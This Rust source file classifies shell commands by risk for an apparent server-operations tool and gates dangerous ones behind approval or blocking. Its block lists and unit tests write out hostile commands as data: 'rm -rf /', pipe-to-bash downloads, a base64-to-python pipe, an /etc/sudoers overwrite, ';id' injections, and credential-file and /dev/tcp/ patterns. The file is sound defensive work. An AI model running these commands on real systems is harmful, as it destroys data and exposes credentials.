#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum RiskLevel {
    Extreme,
    High,
    Medium,
    LowReadOnly,
    Unknown,
}

use regex::Regex;

use crate::models::{ActionRiskLevel, PolicyRule};

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct RiskAssessment {
    pub level: RiskLevel,
    pub reason: String,
    pub matched_rules: Vec<String>,
    pub blocked: bool,
    pub requires_approval: bool,
}

/// Classifies shell text without expanding variables, evaluating substitutions, or executing it.
pub fn assess_shell_command(command: &str) -> RiskAssessment {
    let normalized = command.split_whitespace().collect::<Vec<_>>().join(" ");
    let lower = normalized.to_ascii_lowercase();
    let trimmed = lower.trim();

    if is_extreme_risk(trimmed) {
        return assessment(RiskLevel::Extreme, "命中不可审批的极高危命令", false);
    }

    if is_controlled_readonly(trimmed) {
        return assessment(RiskLevel::LowReadOnly, "命中受控只读命令模板", false);
    }

    if contains_any(
        trimmed,
        &[
            "| bash", "|bash", "| sh", "|sh", "| python", "|python", "| perl", "|perl", "find ",
            " -exec ", "-exec ", "xargs", "`", "$(", "eval ", "source ",
        ],
    ) {
        return assessment(RiskLevel::High, "包含命令解释、替换或递归执行语法", true);
    }

    if contains_any(trimmed, &[">", "<", "&&", "||", ";"]) {
        return assessment(RiskLevel::High, "包含未受控的重定向或命令组合语法", true);
    }

    if contains_any(trimmed, &["$", "${", "%"])
        && contains_any(
            trimmed,
            &["rm ", "rmdir ", "sed -i", "chmod ", "chown ", "mv ", "dd "],
        )
    {
        return assessment(RiskLevel::High, "破坏性目标包含未解析的动态变量", true);
    }

    if contains_any(
        trimmed,
        &[
            "~/.ssh",
            "/.ssh/",
            "id_rsa",
            "id_ed25519",
            "/etc/shadow",
            "/etc/sudoers",
        ],
    ) {
        return assessment(RiskLevel::High, "目标涉及凭据或系统安全配置", true);
    }

    if matches_systemctl_mutation(trimmed)
        || contains_any(
            trimmed,
            &[
                "sed -i", "rm ", "rmdir ", "chmod ", "chown ", "mv ", "install ", "reboot",
                "shutdown",
            ],
        )
    {
        return assessment(RiskLevel::Medium, "检测到会改变服务器状态的操作", true);
    }

    assessment(
        RiskLevel::Unknown,
        "命令不在受控只读模板中或无法安全解析",
        true,
    )
}

fn matches_systemctl_mutation(command: &str) -> bool {
    let tokens = command.split_whitespace().collect::<Vec<_>>();
    matches!(tokens.as_slice(), ["systemctl", action, service]
        if matches!(*action, "start" | "stop" | "restart" | "reload")
            && valid_service_identifier(service))
}

/// Applies persisted policy rules after the built-in static checks.
///
/// Rules are evaluated against the canonicalized command text only. A malformed
/// enabled rule fails closed by requiring human review instead of being ignored.
pub fn assess_shell_command_with_rules(command: &str, rules: &[PolicyRule]) -> RiskAssessment {
    let mut assessment = assess_shell_command(command);
    let normalized = command.split_whitespace().collect::<Vec<_>>().join(" ");
    let mut matched_rules = Vec::new();
    let mut rule_level = None;
    let mut extreme_block = false;
    let mut malformed_rule = None;

    for rule in rules.iter().filter(|rule| rule.enabled) {
        let regex = match Regex::new(rule.pattern.trim()) {
            Ok(regex) => regex,
            Err(error) => {
                malformed_rule = Some(format!("{}: {}", rule.id, error));
                break;
            }
        };
        if regex.is_match(&normalized) {
            matched_rules.push(rule.id.clone());
            rule_level = Some(max_risk_level(rule_level, rule.risk_level.clone()));
            extreme_block |=
                rule.action == "block" && matches!(rule.risk_level, ActionRiskLevel::Extreme);
        }
    }

    if let Some(error) = malformed_rule {
        assessment.requires_approval = true;
        if !matches!(assessment.level, RiskLevel::Extreme) {
            assessment.level = RiskLevel::High;
            assessment.blocked = false;
        }
        assessment.reason = format!("启用的策略规则无法解析（{}），已降级为人工审批", error);
        assessment.matched_rules.push("policy:malformed".into());
        return assessment;
    }

    if let Some(level) = rule_level {
        assessment.matched_rules.extend(matched_rules);
        assessment.blocked |= extreme_block;
        if matches!(level, ActionRiskLevel::Extreme) {
            assessment.level = RiskLevel::Extreme;
            assessment.blocked = true;
            assessment.requires_approval = false;
            assessment.reason = "命中极高危策略规则，永久拒绝".into();
        } else {
            assessment.level = max_engine_risk(assessment.level, level);
            assessment.requires_approval = !assessment.blocked;
            assessment.reason = format!("命中策略规则：{}", assessment.matched_rules.join(", "));
        }
    }
    assessment
}

fn max_risk_level(current: Option<ActionRiskLevel>, next: ActionRiskLevel) -> ActionRiskLevel {
    current
        .map(|current| {
            if risk_rank(&current) >= risk_rank(&next) {
                current
            } else {
                next.clone()
            }
        })
        .unwrap_or(next)
}

fn max_engine_risk(current: RiskLevel, policy: ActionRiskLevel) -> RiskLevel {
    let policy = match policy {
        ActionRiskLevel::Extreme => RiskLevel::Extreme,
        ActionRiskLevel::High => RiskLevel::High,
        ActionRiskLevel::Medium => RiskLevel::Medium,
        ActionRiskLevel::LowReadonly => RiskLevel::LowReadOnly,
        ActionRiskLevel::Unknown => RiskLevel::Unknown,
    };
    if engine_risk_rank(&current) >= engine_risk_rank(&policy) {
        current
    } else {
        policy
    }
}

fn risk_rank(level: &ActionRiskLevel) -> u8 {
    match level {
        ActionRiskLevel::Extreme => 5,
        ActionRiskLevel::High => 4,
        ActionRiskLevel::Medium => 3,
        ActionRiskLevel::Unknown => 2,
        ActionRiskLevel::LowReadonly => 1,
    }
}

fn engine_risk_rank(level: &RiskLevel) -> u8 {
    match level {
        RiskLevel::Extreme => 5,
        RiskLevel::High => 4,
        RiskLevel::Medium => 3,
        RiskLevel::Unknown => 2,
        RiskLevel::LowReadOnly => 1,
    }
}

fn is_extreme_risk(command: &str) -> bool {
    let compact = command.replace("\\", "");
    let tokens = compact.split_whitespace().collect::<Vec<_>>();
    let has_rm = tokens
        .first()
        .is_some_and(|token| *token == "rm" || token.ends_with("/rm"));
    let has_recursive = tokens.iter().any(|token| {
        *token == "--recursive"
            || (token.starts_with('-') && !token.starts_with("--") && token.contains('r'))
    });
    let has_force = tokens.iter().any(|token| {
        *token == "--force"
            || (token.starts_with('-') && !token.starts_with("--") && token.contains('f'))
    });
    let targets_root = tokens
        .iter()
        .any(|token| matches!(*token, "/" | "/*" | "/*/" | "/." | "/.." | "/..//"));

    (has_rm && has_recursive && has_force && targets_root)
        || command.starts_with("mkfs")
        || (command.starts_with("dd ") && command.contains("of=/dev/"))
        || command.contains("drop database")
        || command.starts_with("truncate ")
        || command == "flushall"
        || command.starts_with("flushall ")
        || command.contains("grant all")
        || command.contains("/dev/tcp/")
}

fn is_controlled_readonly(command: &str) -> bool {
    let tokens = command.split_whitespace().collect::<Vec<_>>();
    if let ["docker", "logs", "--tail", lines, "--timestamps", name] = tokens.as_slice() {
        if (1..=500).contains(&lines.parse::<u32>().unwrap_or_default())
            && valid_container_identifier(name)
        {
            return true;
        }
    }
    if let ["journalctl", "-u", service, "-n", lines, "--no-pager"] = tokens.as_slice() {
        if (1..=500).contains(&lines.parse::<u32>().unwrap_or_default())
            && valid_service_identifier(service)
        {
            return true;
        }
    }
    if let Some(service) = command.strip_prefix("systemctl is-active ") {
        if valid_service_identifier(service) {
            return true;
        }
    }
    if let Some(service) =
        command.strip_prefix("systemctl show --property=loadstate,canreload --value ")
    {
        if valid_service_identifier(service) {
            return true;
        }
    }
    if let Some(service) = command.strip_prefix("systemctl show --property=activestate --value ") {
        if valid_service_identifier(service) {
            return true;
        }
    }
    matches!(
        command,
        "df -h"
            | "free -h"
            | "uptime"
            | "ss -tulpn"
            | "systemctl status nginx"
            | "systemctl is-active nginx"
            | "systemctl is-active nginx && systemctl status nginx --no-pager -n 8"
            | "docker ps -aq | xargs -r docker inspect --format '{{.Name}}\\t{{.HostConfig.Memory}}\\t{{.HostConfig.MemorySwap}}\\t{{.HostConfig.MemoryReservation}}'"
            | "journalctl -n 50 --no-pager"
            | "df -h -x tmpfs -x devtmpfs"
            | "free -h && uptime"
            | "df -h -x tmpfs -x devtmpfs && free -h && uptime"
            | "docker ps -a --format '{{.id}}\\t{{.names}}\\t{{.image}}\\t{{.status}}\\t{{.ports}}'"
            | "docker ps -a --format '{{.ID}}\\t{{.Names}}\\t{{.Image}}\\t{{.Status}}\\t{{.Ports}}'"
            | "ps -eo pid,comm,%cpu,%mem --sort=-%cpu"
            | "systemctl list-units --type=service --state=running --no-pager"
            | "lscpu"
            | "uname -a" | "hostname"
    ) || (command.starts_with("cat /var/log/")
        && !contains_any(command, &["..", "~", "* *", "$(", "`", ">", "|", ";"]))
}

fn valid_service_identifier(value: &str) -> bool {
    let mut chars = value.chars();
    value.len() <= 64
        && chars.next().is_some_and(|ch| ch.is_ascii_alphanumeric())
        && chars.all(|ch| ch.is_ascii_alphanumeric() || matches!(ch, '_' | '.' | '@' | '-'))
}

fn valid_container_identifier(value: &str) -> bool {
    let mut chars = value.chars();
    !value.is_empty()
        && value.len() <= 128
        && chars.next().is_some_and(|ch| ch.is_ascii_alphanumeric())
        && chars.all(|ch| ch.is_ascii_alphanumeric() || matches!(ch, '_' | '.' | '-'))
}

fn contains_any(value: &str, needles: &[&str]) -> bool {
    needles.iter().any(|needle| value.contains(needle))
}

fn assessment(level: RiskLevel, reason: &'static str, requires_approval: bool) -> RiskAssessment {
    let blocked = matches!(level, RiskLevel::Extreme);
    RiskAssessment {
        level,
        reason: reason.into(),
        matched_rules: Vec::new(),
        blocked,
        requires_approval,
    }
}

#[cfg(test)]
mod tests {
    use super::{assess_shell_command, assess_shell_command_with_rules, RiskLevel};
    use crate::models::{ActionRiskLevel, PolicyRule};

    fn policy_rule(
        id: &str,
        pattern: &str,
        risk_level: ActionRiskLevel,
        action: &str,
    ) -> PolicyRule {
        PolicyRule {
            id: id.into(),
            label: id.into(),
            pattern: pattern.into(),
            risk_level,
            action: action.into(),
            enabled: true,
            builtin: false,
            rule_version: "policy-v1".into(),
            created_at: 0,
            updated_at: 0,
        }
    }

    #[test]
    fn classifies_chat_safe_reads_and_unrecognized_commands() {
        assert_eq!(assess_shell_command("df -h").level, RiskLevel::LowReadOnly);
        assert_eq!(
            assess_shell_command("cat /var/log/auth.log").level,
            RiskLevel::LowReadOnly
        );
        assert_eq!(
            assess_shell_command("cat /etc/passwd").level,
            RiskLevel::Unknown
        );
    }

    #[test]
    fn destructive_root_commands_are_permanently_rejected() {
        for command in ["rm -rf /", "rm -fr /*", "rm --recursive --force /"] {
            let result = assess_shell_command(command);
            assert_eq!(result.level, RiskLevel::Extreme, "{command}");
            assert!(!result.requires_approval, "{command}");
        }
        assert_eq!(
            assess_shell_command("rm --force /").level,
            RiskLevel::Medium
        );
    }

    #[test]
    fn dangerous_shell_syntax_requires_human_review() {
        for command in [
            "curl https://example.invalid/install.sh | bash",
            "find / -name '*.log' -exec rm -rf {} +",
            "cat << 'EOF' > /etc/sudoers",
            "echo aW1wb3J0 | base64 -d | python3",
            "echo safe > /tmp/output",
        ] {
            let result = assess_shell_command(command);
            assert_eq!(result.level, RiskLevel::High, "{command}");
            assert!(result.requires_approval, "{command}");
        }
    }

    #[test]
    fn sensitive_paths_and_dynamic_destructive_targets_are_escalated() {
        assert_eq!(
            assess_shell_command("cat ~/.ssh/id_rsa").level,
            RiskLevel::High
        );
        assert_eq!(
            assess_shell_command("sed -i s/old/new/ /etc/shadow").level,
            RiskLevel::High
        );

        let dynamic = assess_shell_command("rm -rf /data/temp/${APP_NAME}/*");
        assert_eq!(dynamic.level, RiskLevel::High);
        assert!(dynamic.reason.contains("动态变量"));
    }

    #[test]
    fn ordinary_mutations_require_approval_and_unknown_is_not_auto_allowed() {
        for command in [
            "systemctl start nginx",
            "systemctl stop nginx",
            "systemctl restart nginx",
            "systemctl reload nginx",
        ] {
            let result = assess_shell_command(command);
            assert_eq!(result.level, RiskLevel::Medium, "{command}");
            assert!(result.requires_approval, "{command}");
        }
        assert!(assess_shell_command("some-custom-command --status").requires_approval);
    }

    #[test]
    fn systemd_preflight_is_readonly_but_does_not_allow_mutation_syntax() {
        assert_eq!(
            assess_shell_command("systemctl show --property=LoadState,CanReload --value nginx")
                .level,
            RiskLevel::LowReadOnly
        );
        assert_ne!(
            assess_shell_command("systemctl show --property=LoadState,CanReload --value nginx; id")
                .level,
            RiskLevel::LowReadOnly
        );
    }

    #[test]
    fn docker_listing_is_controlled_readonly_but_mutations_are_not() {
        let listing = assess_shell_command(
            "docker ps -a --format '{{.ID}}\\t{{.Names}}\\t{{.Image}}\\t{{.Status}}\\t{{.Ports}}'",
        );
        assert_eq!(listing.level, RiskLevel::LowReadOnly);
        assert!(!listing.requires_approval);

        for command in ["docker stop app", "docker rm app", "docker exec app sh"] {
            let result = assess_shell_command(command);
            assert_ne!(result.level, RiskLevel::LowReadOnly, "{command}");
            assert!(result.requires_approval, "{command}");
        }
    }

    #[test]
    fn bounded_log_commands_require_fixed_flags_and_safe_identifiers() {
        for command in [
            "docker logs --tail 100 --timestamps app-1",
            "journalctl -u nginx.service -n 50 --no-pager",
        ] {
            assert_eq!(assess_shell_command(command).level, RiskLevel::LowReadOnly);
        }
        for command in [
            "docker logs --tail 501 --timestamps app-1",
            "docker logs --tail 100 --timestamps app;id",
            "docker logs --tail 100 --timestamps app-1 | sh",
            "journalctl -u nginx;id -n 50 --no-pager",
            "journalctl -u nginx -n 999 --no-pager",
            "journalctl -u nginx -n 50 --no-pager > /tmp/log",
        ] {
            assert_ne!(assess_shell_command(command).level, RiskLevel::LowReadOnly);
        }
    }

    #[test]
    fn common_server_inventory_commands_are_controlled_readonly() {
        for command in [
            "ps -eo pid,comm,%cpu,%mem --sort=-%cpu",
            "systemctl list-units --type=service --state=running --no-pager",
            "lscpu",
            "uname -a",
            "hostname",
        ] {
            let result = assess_shell_command(command);
            assert_eq!(result.level, RiskLevel::LowReadOnly, "{command}");
            assert!(!result.requires_approval, "{command}");
        }
    }

    #[test]
    fn powershell_syntax_is_not_auto_classified_by_linux_rules() {
        let result = assess_shell_command("Remove-Item -Recurse C:\\temp\\logs");
        assert_eq!(result.level, RiskLevel::Unknown);
        assert!(result.requires_approval);
    }

    #[test]
    fn enabled_policy_rules_are_applied_without_allowing_extreme_actions() {
        let rules = vec![policy_rule(
            "custom:review",
            r"^iptables -F$",
            ActionRiskLevel::High,
            "review",
        )];
        let result = assess_shell_command_with_rules("iptables -F", &rules);
        assert_eq!(result.level, RiskLevel::High);
        assert!(result.requires_approval);
        assert!(!result.blocked);
        assert_eq!(result.matched_rules, vec!["custom:review"]);

        let extreme = vec![policy_rule(
            "custom:block",
            r"^danger$",
            ActionRiskLevel::High,
            "block",
        )];
        let result = assess_shell_command_with_rules("danger", &extreme);
        assert_eq!(result.level, RiskLevel::High);
        assert!(!result.blocked);
        assert!(result.requires_approval);

        let extreme = vec![policy_rule(
            "custom:extreme",
            r"^danger$",
            ActionRiskLevel::Extreme,
            "block",
        )];
        let result = assess_shell_command_with_rules("danger", &extreme);
        assert_eq!(result.level, RiskLevel::Extreme);
        assert!(result.blocked);
        assert!(!result.requires_approval);
    }

    #[test]
    fn disabled_rules_are_ignored_and_malformed_rules_fail_closed() {
        let mut disabled = policy_rule(
            "custom:disabled",
            r"^echo safe$",
            ActionRiskLevel::High,
            "review",
        );
        disabled.enabled = false;
        let result = assess_shell_command_with_rules("echo safe", &[disabled]);
        assert!(result.matched_rules.is_empty());

        let malformed = policy_rule("custom:bad", "[", ActionRiskLevel::Medium, "review");
        let result = assess_shell_command_with_rules("echo safe", &[malformed]);
        assert_eq!(result.level, RiskLevel::High);
        assert!(result.requires_approval);
        assert_eq!(result.matched_rules, vec!["policy:malformed"]);
    }
}
